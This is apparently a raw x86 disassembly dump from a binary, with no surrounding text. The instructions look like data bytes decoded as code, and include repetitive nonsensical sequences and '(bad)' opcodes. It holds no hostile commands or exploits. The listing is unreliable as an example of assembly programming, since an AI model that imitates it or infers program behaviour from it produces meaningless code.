  405545:	add    BYTE PTR [edx],dl
  405547:	adc    BYTE PTR [ebx+0x3800060a],ah
  40554d:	adc    bl,bl
  40554f:	add    eax,0x105a0006
  405554:	fild   DWORD PTR ds:0x107c0006
  40555a:	mov    ds:0x9700060a,eax
  40555f:	adc    BYTE PTR [ebx-0x3cfff9f6],ah
  405565:	adc    BYTE PTR [eax-0x28ff68f0],dh
  40556b:	adc    BYTE PTR [eax],al
  40556d:	add    BYTE PTR [esi],al
  40556f:	add    BYTE PTR [esi],al
  405571:	adc    esi,esp
  405573:	adc    BYTE PTR [esi],al
  405575:	add    BYTE PTR [esi],ah
  405577:	adc    esi,esp
  405579:	adc    BYTE PTR [esi],al
  40557b:	add    BYTE PTR [eax+0x11],ah
  40557e:	test   eax,0x78000600
  405583:	adc    DWORD PTR [ecx-0x61fffa00],ebp
  405589:	adc    DWORD PTR [ecx-0x36fffa00],ebp
  40558f:	adc    DWORD PTR [eax-0x1afff9ef],edi
  405595:	adc    DWORD PTR [ecx+0x1b000600],ebp
  40559b:	adc    ch,BYTE PTR [ecx+0x3b000600]
  4055a1:	adc    ch,BYTE PTR [ecx+0x43000600]
  4055a7:	adc    cl,BYTE PTR [edi+0x1]
  4055aa:	push   es
  4055ab:	add    BYTE PTR [eax+0x12],bl
  4055ae:	test   eax,0x68000600
  4055b3:	adc    cl,BYTE PTR [edi+0x1]
  4055b6:	push   es
  4055b7:	add    BYTE PTR [edi+0x600a912],dl
  4055bd:	add    cl,ch
  4055bf:	adc    ah,BYTE PTR [ebx+0x1100060a]
  4055c5:	adc    ecx,DWORD PTR [edi+0x1]
  4055c8:	push   es
  4055c9:	add    BYTE PTR [eax],dh
  4055cb:	adc    edi,DWORD PTR [esi+0x4c000608]
  4055d1:	adc    edi,DWORD PTR [esi+0x74000608]
  4055d7:	adc    ebp,DWORD PTR [ecx-0x6ffffa00]
  4055dd:	adc    ebp,DWORD PTR [ecx-0x29fff200]
  4055e3:	adc    ecx,ebx
  4055e5:	adc    eax,DWORD PTR [esi]
  4055e7:	add    bl,ah
  4055e9:	adc    edx,ecx
  4055eb:	or     al,0x6
  4055ed:	add    BYTE PTR [ecx],al
  4055ef:	adc    al,0xa9
  4055f1:	add    BYTE PTR [esi],al
  4055f3:	add    BYTE PTR [ebx],dl
  4055f5:	adc    al,0x4f
  4055f7:	add    DWORD PTR [edi],ebp
  4055f9:	add    BYTE PTR [edi],bl
  4055fb:	adc    al,0x0
  4055fd:	add    BYTE PTR [esi],al
  4055ff:	add    BYTE PTR [ecx+0x14],dl
  405602:	test   eax,0x81000600
  405607:	adc    al,0xa9
  405609:	add    BYTE PTR [edx],cl
  40560b:	add    BYTE PTR [ebp+0x6149514],ch
  405611:	add    ah,cl
  405613:	adc    al,0xa9
  405615:	add    BYTE PTR [edx],dl
  405617:	add    BYTE PTR [ebp+edx*1+0x45],bl
  40561b:	adc    eax,0x15b8000a
  405620:	test   eax,0xc8000615
  405625:	adc    eax,0xa0a47
  40562a:	cli    
  40562b:	adc    eax,0xa15db
  405630:	and    al,0x16
  405632:	xchg   ebp,eax
  405633:	adc    al,0x6
  405635:	add    BYTE PTR [ecx],bh
  405637:	push   ss
  405638:	ror    DWORD PTR [esi+eax*1],1
  40563b:	add    BYTE PTR [esi+0x16],al
  40563e:	dec    edi
  40563f:	add    DWORD PTR [esi],edx
  405641:	add    BYTE PTR [esi+edx*1+0x605db],cl
  405648:	leave  
  405649:	push   ss
  40564a:	fild   DWORD PTR ds:0x16d80006
  405650:	inc    edi
  405651:	or     al,BYTE PTR [esi]
  405653:	add    BYTE PTR [eax],al
  405655:	pop    ss
  405656:	inc    edi
  405657:	or     al,BYTE PTR [esi]
  405659:	add    BYTE PTR [edi+edx*1],cl
  40565c:	dec    edi
  40565d:	add    DWORD PTR [esi],eax
  40565f:	add    BYTE PTR [edx],ah
  405661:	pop    ss
  405662:	test   eax,0x29000600
  405667:	pop    ss
  405668:	mov    esi,0x3c001608
  40566d:	pop    ss
  40566e:	fild   DWORD PTR ds:0x174f0006
  405674:	fild   DWORD PTR ds:0x1750006
  40567a:	test   eax,0x81000a00
  40567f:	pop    ss
  405680:	xchg   ebp,eax
  405681:	adc    al,0x6
  405683:	add    BYTE PTR [esi+0x600a917],ch
  405689:	add    bl,dl
  40568b:	pop    ss
  40568c:	inc    edi
  40568d:	or     al,BYTE PTR [esi]
  40568f:	add    ch,ah
  405691:	pop    ss
  405692:	test   eax,0x0
  405697:	add    BYTE PTR [ecx],al
  405699:	add    BYTE PTR [eax],al
  40569b:	add    BYTE PTR [eax],al
  40569d:	add    BYTE PTR [ecx],al
  40569f:	add    BYTE PTR [ecx],al
  4056a1:	add    BYTE PTR [eax+0x15001001],al
  4056a7:	add    BYTE PTR [eax],al
  4056a9:	add    BYTE PTR ds:0x1000100,al
  4056af:	add    BYTE PTR [eax+0x22001001],al
  4056b5:	add    BYTE PTR [eax],al
  4056b7:	add    BYTE PTR ds:0x1000200,al
  4056bd:	add    BYTE PTR [eax+0x2f001001],al
  4056c3:	add    BYTE PTR [eax],al
  4056c5:	add    BYTE PTR ds:0x1000300,al
  4056cb:	add    BYTE PTR [eax+0x3a001001],al
  4056d1:	add    BYTE PTR [eax],al
  4056d3:	add    BYTE PTR ds:0x1000400,al
  4056d9:	add    BYTE PTR [eax+0x47001001],al
  4056df:	add    BYTE PTR [eax],al
  4056e1:	add    BYTE PTR ds:0x1000b00,al
  4056e7:	add    BYTE PTR [eax+0x53001001],al
  4056ed:	add    BYTE PTR [eax],al
  4056ef:	add    BYTE PTR ds:0x1003e00,al
  4056f5:	add    BYTE PTR [eax],al
  4056f7:	add    DWORD PTR [eax],edx
  4056f9:	add    BYTE PTR [eax+eax*1+0x7b],ah
  4056fd:	add    BYTE PTR [ecx],cl
  4056ff:	add    BYTE PTR [edi],bh
  405701:	add    BYTE PTR ds:0x10010000,al
  405707:	add    BYTE PTR [eax+0xd007b00],cl
  40570d:	add    BYTE PTR [eax+0x0],al
  405710:	pop    es
  405711:	add    BYTE PTR [eax],al
  405713:	add    DWORD PTR [eax],edx
  405715:	add    BYTE PTR [eax+eax*1+0x5007b],bl
  40571c:	inc    eax
  40571d:	add    BYTE PTR [ecx],cl
  40571f:	add    BYTE PTR [eax-0x60ffefff],al
  405725:	add    BYTE PTR [ecx+0x63000500],ch
  40572b:	add    BYTE PTR [eax],dl
  40572d:	add    BYTE PTR [ecx],al
  40572f:	add    DWORD PTR [eax],edx
  405731:	add    BYTE PTR [eax+0x5007b00],dh
  405737:	add    BYTE PTR [eax+0x5001000],cl
  40573d:	add    DWORD PTR [eax],edx
  40573f:	add    BYTE PTR [edi+0x5000000],dh
  405745:	add    BYTE PTR [esi+0x5002d00],cl
  40574b:	add    DWORD PTR [eax],edx
  40574d:	add    ah,cl
  40574f:	add    BYTE PTR [eax],al
  405751:	add    BYTE PTR [ecx],dl
  405753:	add    BYTE PTR [ebx+0x5003400],dl
  405759:	add    DWORD PTR [eax],edx
  40575b:	add    bl,ah
  40575d:	add    BYTE PTR [eax],al
  40575f:	add    BYTE PTR ds:0x3c009500,dl
  405765:	add    BYTE PTR [ebx],al
  405767:	add    DWORD PTR [eax],eax
  405769:	add    ch,dh
  40576b:	add    BYTE PTR [eax],al
  40576d:	add    BYTE PTR [ecx],bl
  40576f:	add    BYTE PTR [eax+0x3004000],bl
  405775:	add    BYTE PTR [eax],dl
  405777:	add    ah,bh
  405779:	add    BYTE PTR [eax],al
  40577b:	add    BYTE PTR ds:0x40009c00,al
  405781:	add    BYTE PTR [ebx-0x80],dl
  405784:	jne    0x405787
  405786:	or     al,BYTE PTR [eax]
  405788:	push   ebx
  405789:	xor    BYTE PTR [ebp+0x1],0xa
  40578d:	add    BYTE PTR [ebx-0x80],dl
  405790:	jne    0x405793
  405792:	or     al,BYTE PTR [eax]
  405794:	push   ebx
  405795:	cmp    BYTE PTR [ebp+0x1],0xa
  405799:	add    BYTE PTR [ebx-0x80],dl
  40579c:	add    DWORD PTR [ecx],0xa
  40579f:	add    BYTE PTR [ebx-0x80],dl
  4057a2:	pop    DWORD PTR [ecx]
  4057a4:	or     al,BYTE PTR [eax]
  4057a6:	push   ebx
  4057a7:	sbb    BYTE PTR [ecx+eax*1-0x7facfff6],0x75
  4057af:	add    DWORD PTR [edx],ecx
  4057b1:	add    BYTE PTR [ebx-0x80],dl
  4057b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057b5:	add    DWORD PTR [edx],ecx
  4057b7:	add    BYTE PTR [ebx-0x80],dl
  4057ba:	mov    ebx,0x5300ba01
  4057bf:	or     ah,0x1
  4057c2:	or     al,BYTE PTR [eax]
  4057c4:	push   ebx
  4057c5:	sbb    dl,0x1
  4057c8:	or     al,BYTE PTR [eax]
  4057ca:	push   ebx
  4057cb:	sub    ch,0x1
  4057ce:	or     al,BYTE PTR [eax]
  4057d0:	push   ebx
  4057d1:	cmp    bh,0x1
  4057d4:	or     al,BYTE PTR [eax]
  4057d6:	push   ebx
  4057d7:	or     BYTE PTR [eax],0x2
  4057da:	or     al,BYTE PTR [eax]
  4057dc:	push   ebx
  4057dd:	adc    BYTE PTR [ebx],0x2
  4057e0:	or     al,BYTE PTR [eax]
  4057e2:	push   ebx
  4057e3:	sub    BYTE PTR [ecx+0x53000a00],0x80
  4057ea:	sub    al,BYTE PTR [edx]
  4057ec:	or     al,BYTE PTR [eax]
  4057ee:	push   ebx
  4057ef:	add    BYTE PTR [eax+0x2],0xa
  4057f3:	add    BYTE PTR [ebx-0x80],dl
  4057f6:	push   ebx
  4057f7:	add    cl,BYTE PTR [edx]
  4057f9:	add    BYTE PTR [ebx-0x80],dl
  4057fc:	pop    ebp
  4057fd:	add    cl,BYTE PTR [edx]
  4057ff:	add    BYTE PTR [ebx-0x80],dl
  405802:	jo     0x405806
  405804:	or     al,BYTE PTR [eax]
  405806:	push   ebx
  405807:	or     BYTE PTR [eax+0x53000a02],0x80
  40580e:	lahf   
  40580f:	add    cl,BYTE PTR [edx]
  405811:	add    BYTE PTR [ebx-0x80],dl
  405814:	mov    dl,0x2
  405816:	or     al,BYTE PTR [eax]
  405818:	push   ebx
  405819:	or     dl,0x2
  40581c:	or     al,BYTE PTR [eax]
  40581e:	push   ebx
  40581f:	and    cl,0x2
  405822:	or     al,BYTE PTR [eax]
  405824:	push   ebx
  405825:	add    BYTE PTR ds:0x53000a03,0x80
  40582c:	sbb    DWORD PTR [ebx],eax
  40582e:	or     al,BYTE PTR [eax]
  405830:	push   ebx
  405831:	xor    BYTE PTR [ebx+eax*1],0xa
  405835:	add    BYTE PTR [ebx-0x80],dl
  405838:	inc    ebp
  405839:	add    ecx,DWORD PTR [edx]
  40583b:	add    BYTE PTR [ebx-0x80],dl
  40583e:	push   edx
  40583f:	add    ecx,DWORD PTR [edx]
  405841:	add    BYTE PTR [ebx-0x80],dl
  405844:	push   0x3
  405846:	or     al,BYTE PTR [eax]
  405848:	push   ebx
  405849:	cmp    BYTE PTR [esi+0x3],0xa
  40584d:	add    BYTE PTR [ebx-0x80],dl
  405850:	mov    WORD PTR [ebx],es
  405852:	or     al,BYTE PTR [eax]
  405854:	push   ebx
  405855:	and    BYTE PTR [ebp+0x53000a03],0x80
  40585c:	mov    dh,0x3
  40585e:	or     al,BYTE PTR [eax]
  405860:	push   ebx
  405861:	add    dh,0x3
  405864:	or     al,BYTE PTR [eax]
  405866:	push   ebx
  405867:	sub    bh,0x3
  40586a:	or     al,BYTE PTR [eax]
  40586c:	push   ebx
  40586d:	cmp    dh,0x3
  405870:	or     al,BYTE PTR [eax]
  405872:	push   ebx
  405873:	adc    BYTE PTR [ebx],0x4
  405876:	or     al,BYTE PTR [eax]
  405878:	push   ebx
  405879:	sbb    BYTE PTR ds:0x53000a04,0x80
  405880:	xor    eax,DWORD PTR [edx+ecx*1]
  405883:	add    BYTE PTR [ebx-0x80],dl
  405886:	dec    eax
  405887:	add    al,0xa
  405889:	add    BYTE PTR [ebx-0x80],dl
  40588c:	arpl   WORD PTR [edx+ecx*1],ax
  40588f:	add    BYTE PTR [ebx-0x80],dl
  405892:	jns    0x405898
  405894:	or     al,BYTE PTR [eax]
  405896:	push   ebx
  405897:	or     BYTE PTR [ebp+0x53000a04],0x80
  40589e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40589f:	add    al,0xa
  4058a1:	add    BYTE PTR [ebx-0x80],dl
  4058a4:	mov    bh,0x4
  4058a6:	or     al,BYTE PTR [eax]
  4058a8:	push   ebx
  4058a9:	adc    bl,0x4
  4058ac:	or     al,BYTE PTR [eax]
  4058ae:	push   ebx
  4058af:	and    ah,0x4
  4058b2:	or     al,BYTE PTR [eax]
  4058b4:	push   ebx
  4058b5:	xor    dh,0x4
  4058b8:	or     al,BYTE PTR [eax]
  4058ba:	push   ebx
  4058bb:	or     BYTE PTR [eax*1-0x7facfff6],0x2e
  4058c3:	add    eax,0x8053000a
  4058c8:	inc    edx
  4058c9:	add    eax,0x8053000a
  4058ce:	pop    edx
  4058cf:	add    eax,0x8053000a
  4058d4:	jo     0x4058db
  4058d6:	or     al,BYTE PTR [eax]
  4058d8:	push   ebx
  4058d9:	add    BYTE PTR [ebp+eax*1-0x7facfff6],0x9d
  4058e1:	add    eax,0x8053000a
  4058e6:	mov    al,0x5
  4058e8:	or     al,BYTE PTR [eax]
  4058ea:	push   ebx
  4058eb:	or     dl,0x5
  4058ee:	or     al,BYTE PTR [eax]
  4058f0:	adc    DWORD PTR [eax],eax
  4058f2:	cld    
  4058f3:	add    eax,0x1231f
  4058f8:	imul   eax,DWORD PTR [esi],0x30
  4058fb:	and    edx,DWORD PTR [ebx-0x80]
  4058fe:	popf   
  4058ff:	push   es
  405900:	or     al,BYTE PTR [eax]
  405902:	push   ebx
  405903:	xor    BYTE PTR [edx+0x53000a06],0x80
  40590a:	mov    DWORD PTR [esi],0x8053000a
  405910:	aam    0x6
  405912:	or     al,BYTE PTR [eax]
  405914:	push   ebx
  405915:	and    al,0x6
  405918:	or     al,BYTE PTR [eax]
  40591a:	push   ebx
  40591b:	sub    bl,0x6
  40591e:	or     al,BYTE PTR [eax]
  405920:	push   ebx
  405921:	cmp    cl,0x6
  405924:	or     al,BYTE PTR [eax]
  405926:	push   ebx
  405927:	adc    BYTE PTR [eax],0x7
  40592a:	or     al,BYTE PTR [eax]
  40592c:	push   ebx
  40592d:	sbb    BYTE PTR [esi],0x7
  405930:	or     al,BYTE PTR [eax]
  405932:	push   ebx
  405933:	xor    BYTE PTR [eax],0x7
  405936:	or     al,BYTE PTR [eax]
  405938:	push   ebx
  405939:	cmp    BYTE PTR [ebx],0x7
  40593c:	or     al,BYTE PTR [eax]
  40593e:	push   ebx
  40593f:	or     BYTE PTR [eax+0x7],0xa
  405943:	add    BYTE PTR [ebx-0x80],dl
  405946:	push   edi
  405947:	pop    es
  405948:	or     al,BYTE PTR [eax]
  40594a:	push   ebx
  40594b:	sub    BYTE PTR [ebx+0x7],0xa
  40594f:	add    BYTE PTR [ebx-0x80],dl
  405952:	je     0x40595b
  405954:	or     al,BYTE PTR [eax]
  405956:	push   ebx
  405957:	add    BYTE PTR [ebp+0x53000a07],0x80
  40595e:	call   0xa480:0x53000a07
  405965:	pop    es
  405966:	or     al,BYTE PTR [eax]
  405968:	push   ebx
  405969:	sub    BYTE PTR [ebx+0x53000a07],0x80
  405970:	mov    dl,0x7
  405972:	or     al,BYTE PTR [eax]
  405974:	push   ebx
  405975:	cmp    BYTE PTR [edi+0x53000a07],0x80
  40597c:	mov    DWORD PTR [edi],0x8053000a
  405982:	aad    0x7
  405984:	or     al,BYTE PTR [eax]
  405986:	push   ebx
  405987:	sub    ah,0x7
  40598a:	or     al,BYTE PTR [eax]
  40598c:	push   ebx
  40598d:	add    BYTE PTR [ebx],0x8
  405990:	or     al,BYTE PTR [eax]
  405992:	push   ebx
  405993:	adc    BYTE PTR [esi],0x8
  405996:	or     al,BYTE PTR [eax]
  405998:	push   ebx
  405999:	and    BYTE PTR [ecx],0x8
  40599c:	or     al,BYTE PTR [eax]
  40599e:	push   ebx
  40599f:	xor    BYTE PTR [eax+ecx*1],0xa
  4059a3:	add    BYTE PTR [ebx-0x80],dl
  4059a6:	cmp    cl,BYTE PTR [eax]
  4059a8:	or     al,BYTE PTR [eax]
  4059aa:	push   ebx
  4059ab:	adc    BYTE PTR [ebx+0x8],0xa
  4059af:	add    BYTE PTR [ebx-0x80],dl
  4059b2:	push   0x53000a08
  4059b7:	cmp    BYTE PTR [ecx+0x8],0xa
  4059bb:	add    BYTE PTR [ebx-0x80],dl
  4059be:	xchg   esp,eax
  4059bf:	or     BYTE PTR [edx],cl
  4059c1:	add    BYTE PTR [ecx],dl
  4059c3:	add    BYTE PTR [ebx+0x1273008],ah
  4059c9:	add    BYTE PTR [edx+0x56231f08],ch
  4059cf:	adc    BYTE PTR ds:0x56000a09,0x80
  4059d6:	push   ds
  4059d7:	or     DWORD PTR [edx],ecx
  4059d9:	add    BYTE PTR [esi-0x80],dl
  4059dc:	daa    
  4059dd:	or     DWORD PTR [edx],ecx
  4059df:	add    BYTE PTR [esi-0x80],dl
  4059e2:	xor    BYTE PTR [ecx],cl
  4059e4:	or     al,BYTE PTR [eax]
  4059e6:	push   esi
  4059e7:	cmp    BYTE PTR [ecx],0x9
  4059ea:	or     al,BYTE PTR [eax]
  4059ec:	push   esi
  4059ed:	cmp    BYTE PTR [edi],0x9
  4059f0:	or     al,BYTE PTR [eax]
  4059f2:	push   esi
  4059f3:	add    BYTE PTR [edi+0x9],0xa
  4059f7:	add    BYTE PTR [esi-0x80],dl
  4059fa:	dec    esi
  4059fb:	or     DWORD PTR [edx],ecx
  4059fd:	add    BYTE PTR [esi-0x80],dl
  405a00:	push   esp
  405a01:	or     DWORD PTR [edx],ecx
  405a03:	add    BYTE PTR [esi-0x80],dl
  405a06:	pop    ebp
  405a07:	or     DWORD PTR [edx],ecx
  405a09:	add    BYTE PTR [esi-0x80],dl
  405a0c:	or     WORD PTR [edx],cx
  405a0f:	add    BYTE PTR [esi-0x80],dl
  405a12:	outs   dx,BYTE PTR ds:[esi]
  405a13:	or     DWORD PTR [edx],ecx
  405a15:	add    BYTE PTR [esi-0x80],dl
  405a18:	ja     0x405a23
  405a1a:	or     al,BYTE PTR [eax]
  405a1c:	push   esi
  405a1d:	cmp    BYTE PTR [ebx+0x9],0xa
  405a21:	add    BYTE PTR [esi-0x80],dl
  405a24:	or     BYTE PTR [ecx],0xa
  405a27:	add    BYTE PTR [esi-0x80],dl
  405a2a:	xchg   BYTE PTR [ecx],cl
  405a2c:	or     al,BYTE PTR [eax]
  405a2e:	push   esi
  405a2f:	or     BYTE PTR [ecx+ecx*1-0x7fa9fff6],0x93
  405a37:	or     DWORD PTR [edx],ecx
  405a39:	add    BYTE PTR [esi-0x80],dl
  405a3c:	pushf  
  405a3d:	or     DWORD PTR [edx],ecx
  405a3f:	add    BYTE PTR [esi-0x80],dl
  405a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a43:	or     DWORD PTR [edx],ecx
  405a45:	add    BYTE PTR [esi-0x80],dl
  405a48:	mov    cl,0x9
  405a4a:	or     al,BYTE PTR [eax]
  405a4c:	push   esi
  405a4d:	cmp    BYTE PTR [edx+0x56000a09],0x80
  405a54:	ror    BYTE PTR [ecx],0xa
  405a57:	add    BYTE PTR [esi-0x80],dl
  405a5a:	enter  0xa09,0x0
  405a5e:	push   esi
  405a5f:	adc    cl,0x9
  405a62:	or     al,BYTE PTR [eax]
  405a64:	push   esi
  405a65:	sbb    al,0x9
  405a68:	or     al,BYTE PTR [eax]
  405a6a:	push   esi
  405a6b:	and    al,0x9
  405a6e:	or     al,BYTE PTR [eax]
  405a70:	push   esi
  405a71:	and    dh,0x9
  405a74:	or     al,BYTE PTR [eax]
  405a76:	push   esi
  405a77:	sub    bh,0x9
  405a7a:	or     al,BYTE PTR [eax]
  405a7c:	push   esi
  405a7d:	xor    BYTE PTR [ebp+0x1],0xa
  405a81:	add    BYTE PTR [esi-0x80],dl
  405a84:	clc    
  405a85:	or     DWORD PTR [edx],ecx
  405a87:	add    BYTE PTR [esi-0x80],dl
  405a8a:	add    DWORD PTR [edx],ecx
  405a8c:	or     al,BYTE PTR [eax]
  405a8e:	push   esi
  405a8f:	or     BYTE PTR [ecx],0xa
  405a92:	or     al,BYTE PTR [eax]
  405a94:	push   ebx
  405a95:	adc    BYTE PTR [ecx],0xa
  405a98:	or     al,BYTE PTR [eax]
  405a9a:	push   ebx
  405a9b:	sbb    BYTE PTR [eax],0xa
  405a9e:	or     al,BYTE PTR [eax]
  405aa0:	push   ebx
  405aa1:	sbb    BYTE PTR [edx+ecx*1],0xa
  405aa5:	add    BYTE PTR [ebx-0x80],dl
  405aa8:	and    ecx,DWORD PTR [edx]
  405aaa:	or     al,BYTE PTR [eax]
  405aac:	push   ecx
  405aad:	sub    BYTE PTR ds:0x1100ba0a,0x0
  405ab4:	aaa    
  405ab5:	or     bh,BYTE PTR [edx+0x3e001100]
  405abb:	or     bh,BYTE PTR [edx-0x55ffef00]
  405ac1:	or     BYTE PTR [ecx+0x6e00112a],ch
  405ac7:	or     ch,BYTE PTR [ebp-0x3dffeed6]
  405acd:	or     dh,BYTE PTR [ecx-0x18fffed6]
  405ad3:	or     ecx,DWORD PTR [edx]
  405ad5:	add    BYTE PTR [ecx],al
  405ad7:	add    cl,dh
  405ad9:	or     ecx,DWORD PTR [edx]
  405adb:	add    BYTE PTR [ecx],al
  405add:	add    ah,bh
  405adf:	or     ecx,DWORD PTR [edx]
  405ae1:	add    BYTE PTR [ecx],al
  405ae3:	add    BYTE PTR [edi],al
  405ae5:	or     al,0xa
  405ae7:	add    BYTE PTR [ecx],al
  405ae9:	add    BYTE PTR [edi],dl
  405aeb:	or     al,0x30
  405aed:	and    eax,DWORD PTR [ecx]
  405aef:	add    al,al
  405af1:	or     al,0xba
  405af3:	add    BYTE PTR [ecx],al
  405af5:	add    ah,cl
  405af7:	or     al,0xba
  405af9:	add    BYTE PTR [ecx],al
  405afb:	add    BYTE PTR ds:0x1000a0d,bh
  405b01:	add    al,al
  405b03:	or     al,0xba
  405b05:	add    BYTE PTR [ecx],al
  405b07:	add    BYTE PTR [edi+0xd],al
  405b0a:	mov    edx,0x65060600
  405b0f:	or     eax,0x805600ba
  405b14:	ins    DWORD PTR es:[edi],dx
  405b15:	or     eax,0x80562b6f
  405b1a:	jb     0x405b29
  405b1c:	outs   dx,DWORD PTR ds:[esi]
  405b1d:	sub    edx,DWORD PTR [esi-0x80]
  405b20:	jbe    0x405b2f
  405b22:	outs   dx,DWORD PTR ds:[esi]
  405b23:	sub    eax,DWORD PTR [esi]
  405b25:	add    BYTE PTR [ebp+0xd],bh
  405b28:	or     al,BYTE PTR [eax]
  405b2a:	push   es
  405b2b:	add    BYTE PTR [edx-0x2fd477f3],al
  405b31:	and    BYTE PTR [eax],al
  405b33:	add    BYTE PTR [eax],al
  405b35:	add    BYTE PTR [ebx+0x23060300],dl
  405b3b:	and    eax,DWORD PTR [ecx]
  405b3d:	add    ch,bl
  405b3f:	and    BYTE PTR [eax],al
  405b41:	add    BYTE PTR [eax],al
  405b43:	add    BYTE PTR [ebx+0x28060d08],dl
  405b49:	and    eax,DWORD PTR [edx]
  405b4b:	add    cl,ch
  405b4d:	and    BYTE PTR [eax],al
  405b4f:	add    BYTE PTR [eax],al
  405b51:	add    BYTE PTR [ebx+0x28062508],dl
  405b57:	and    eax,DWORD PTR [edx]
  405b59:	add    ch,dh
  405b5b:	and    BYTE PTR [eax],al
  405b5d:	add    BYTE PTR [eax],al
  405b5f:	add    BYTE PTR [ecx+0x2f114418],dl
  405b65:	sub    eax,DWORD PTR [edx]
  405b67:	add    BYTE PTR [ebx],cl
  405b69:	and    DWORD PTR [eax],eax
  405b6b:	add    BYTE PTR [eax],al
  405b6d:	add    BYTE PTR [esi+0x33067418],al
  405b73:	and    eax,DWORD PTR [edx]
  405b75:	add    BYTE PTR [ecx+eiz*1],dl
  405b78:	add    BYTE PTR [eax],al
  405b7a:	add    BYTE PTR [eax],al
  405b7c:	(bad)  
  405b7d:	or     BYTE PTR [edx+0x6],bh
  405b80:	cmp    BYTE PTR [ebx],ah
  405b82:	add    eax,DWORD PTR [eax]
  405b84:	cmp    al,0x21
  405b86:	add    BYTE PTR [eax],al
  405b88:	add    BYTE PTR [eax],al
  405b8a:	xchg   BYTE PTR [eax],bl
  405b8c:	je     0x405b94
  405b8e:	xor    esp,DWORD PTR [ebx]
  405b90:	add    eax,DWORD PTR [eax]
  405b92:	inc    ebp
  405b93:	and    DWORD PTR [eax],eax
  405b95:	add    BYTE PTR [eax],al
  405b97:	add    ah,al
  405b99:	add    BYTE PTR [edx+0x4234006],cl
  405b9f:	add    BYTE PTR [ebp+0x21],cl
  405ba2:	add    BYTE PTR [eax],al
  405ba4:	add    BYTE PTR [eax],al
  405ba6:	sbb    DWORD PTR [eax],0x74
  405ba9:	push   es
  405baa:	xor    al,0x27
  405bac:	add    eax,0x217000
  405bb1:	add    BYTE PTR [eax],al
  405bb3:	add    BYTE PTR [ecx+0x3808b400],dl
  405bb9:	daa    
  405bba:	add    eax,0x219c00
  405bbf:	add    BYTE PTR [eax],al
  405bc1:	add    BYTE PTR [ecx+0x3d08df08],dl
  405bc7:	daa    
  405bc8:	add    eax,0x219f00
  405bcd:	add    BYTE PTR [eax],al
  405bcf:	add    BYTE PTR [esi+0x4208eb08],dl
  405bd5:	daa    
  405bd6:	add    eax,0x21ac00
  405bdb:	add    BYTE PTR [eax],al
  405bdd:	add    BYTE PTR [esi+0x47060300],dl
  405be3:	daa    
  405be4:	add    eax,0x223000
  405be9:	add    BYTE PTR [eax],al
  405beb:	add    BYTE PTR [esi+0x23060300],dl
  405bf1:	and    eax,DWORD PTR [edi]
  405bf3:	add    BYTE PTR [edx+eiz*1+0x0],bl
  405bf7:	add    BYTE PTR [eax],al
  405bf9:	add    BYTE PTR [esi+0x4e08f900],dl
  405bff:	daa    
  405c00:	or     BYTE PTR [eax],al
  405c02:	mov    BYTE PTR [edx],ah
  405c04:	add    BYTE PTR [eax],al
  405c06:	add    BYTE PTR [eax],al
  405c08:	xchg   ecx,eax
  405c09:	add    bh,cl
  405c0b:	or     bh,BYTE PTR [ecx-0x1bfff6d6]
  405c11:	and    al,BYTE PTR [eax]
  405c13:	add    BYTE PTR [eax],al
  405c15:	add    BYTE PTR [ecx-0x3df53100],dl
  405c1b:	sub    cl,BYTE PTR [esi]
  405c1d:	add    BYTE PTR [ebx],bh
  405c1f:	and    eax,DWORD PTR [eax]
  405c21:	add    BYTE PTR [eax],al
  405c23:	add    BYTE PTR [ecx-0x36f52500],dl
  405c29:	sub    dl,BYTE PTR [ecx]
  405c2b:	add    BYTE PTR [ebx+eiz*1+0x0],al
  405c2f:	add    BYTE PTR [eax],al
  405c31:	add    BYTE PTR [ecx-0x31f52500],dl
  405c37:	sub    dl,BYTE PTR [edx]
  405c39:	add    BYTE PTR [ebp+0x23],dh
  405c3c:	add    BYTE PTR [eax],al
  405c3e:	add    BYTE PTR [eax],al
  405c40:	xchg   ecx,eax
  405c41:	add    bl,bl
  405c43:	or     dl,ah
  405c45:	sub    dl,BYTE PTR [eax+eax*1]
  405c48:	and    BYTE PTR [ebx],0x0
  405c4b:	add    BYTE PTR [eax],al
  405c4d:	add    BYTE PTR [ecx-0x25f52500],dl
  405c53:	sub    dl,BYTE PTR [esi]
  405c55:	add    BYTE PTR [edx+0x23],dh
  405c5b:	add    BYTE PTR [ecx-0x1ef52500],dl
  405c61:	sub    bl,BYTE PTR [ecx]
  405c63:	add    al,al
  405c65:	and    eax,DWORD PTR [eax]
  405c67:	add    BYTE PTR [eax],al
  405c69:	add    BYTE PTR [ecx-0x16f52500],dl
  405c6f:	sub    bl,BYTE PTR ds:0x241800
  405c75:	add    BYTE PTR [eax],al
  405c77:	add    BYTE PTR [ecx-0x36f51f00],dl
  405c7d:	sub    ah,BYTE PTR [edx]
  405c7f:	add    BYTE PTR [ebx+0x24],al
  405c82:	add    BYTE PTR [eax],al
  405c84:	add    BYTE PTR [eax],al
  405c86:	xchg   ecx,eax
  405c87:	add    cl,ah
  405c89:	or     dl,ah
  405c8b:	sub    ah,BYTE PTR [ebx]
  405c8d:	add    BYTE PTR [eax+0x24],dl
  405c90:	add    BYTE PTR [eax],al
  405c92:	add    BYTE PTR [eax],al
  405c94:	xchg   ecx,eax
  405c95:	add    cl,ah
  405c97:	or     bl,dl
  405c99:	sub    ah,BYTE PTR ds:0x248200
  405c9f:	add    BYTE PTR [eax],al
  405ca1:	add    BYTE PTR [ecx-0x1ef51f00],dl
  405ca7:	sub    ch,BYTE PTR [eax]
  405ca9:	add    BYTE PTR [eax+0x24],dl
  405caf:	add    BYTE PTR [ecx-0x16f51f00],dl
  405cb5:	sub    ch,BYTE PTR [eax+eax*1]
  405cb8:	call   0x405ce1
  405cbd:	add    BYTE PTR [ecx-0xdf51700],dl
  405cc3:	sub    dh,BYTE PTR [ecx]
  405cc5:	add    BYTE PTR [ebp+eiz*1+0x0],dh
  405cc9:	add    BYTE PTR [eax],al
  405ccb:	add    BYTE PTR [esi-0x7f50d00],dl
  405cd1:	sub    dh,BYTE PTR [edx]
  405cd3:	add    BYTE PTR [ebx+ebp*1+0x0],bh
  405cda:	xchg   ecx,eax
  405cdb:	add    al,bh
  405cdd:	or     ah,BYTE PTR [ebx]
  405cdf:	and    esi,DWORD PTR [ebx]
  405ce1:	add    al,dh
  405ce3:	sub    eax,DWORD PTR [eax]
  405ce5:	add    BYTE PTR [eax],al
  405ce7:	add    BYTE PTR [ecx-0x1f4f400],dl
